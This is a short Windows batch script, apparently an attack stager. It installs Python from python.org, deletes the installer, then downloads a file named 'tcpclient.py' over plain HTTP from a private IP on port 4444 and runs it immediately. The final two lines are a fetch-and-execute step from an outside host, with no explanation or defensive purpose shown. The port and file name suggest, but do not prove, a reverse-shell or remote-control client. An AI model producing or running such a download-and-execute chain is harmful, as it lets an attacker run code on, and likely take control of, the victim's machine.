echo off

curl -O https://www.python.org/ftp/python/3.11.3/python-3.11.3-amd64.exe

python-3.11.3-amd64.exe

del python-3.11.3-amd64.exe

curl -O http://10.10.10.1:4444/tcpclient.py

python tcpclient.py

